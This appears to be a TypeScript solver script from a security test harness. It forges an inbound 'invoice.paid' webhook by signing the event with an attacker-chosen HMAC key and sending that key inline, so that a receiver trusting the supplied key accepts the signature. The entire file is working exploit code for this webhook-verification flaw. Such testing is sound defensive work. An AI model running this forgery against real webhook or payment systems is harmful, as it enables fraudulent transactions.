// Forged inbound webhook: sign an event with a key the attacker chose and present that key alongside
// the delivery, so a receiver that trusts the inline key accepts a signature it never issued.
import { createHmac } from 'node:crypto'
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const list = await ctx.fetch(ctx.path('listWebhooks'), { session: owner })
  const items = (list.json?.items ?? []) as Array<{ id: string }>
  const endpoint = items[0]?.id
  if (!endpoint) return
  const event = { type: 'invoice.paid', amount: 100000 }
  const ts = String(Math.floor(Date.now() / 1000))
  const payload = JSON.stringify(event)
  const attackerKey = 'rb_fake_attacker_key'
  const sig = createHmac('sha256', attackerKey).update(`${ts}.${payload}`).digest('hex')
  await ctx.fetch(ctx.path('receiveWebhook'), {
    method: 'POST',
    session: owner,
    body: { endpoint, ts, event, key: attackerKey, signature: sig },
  })
}
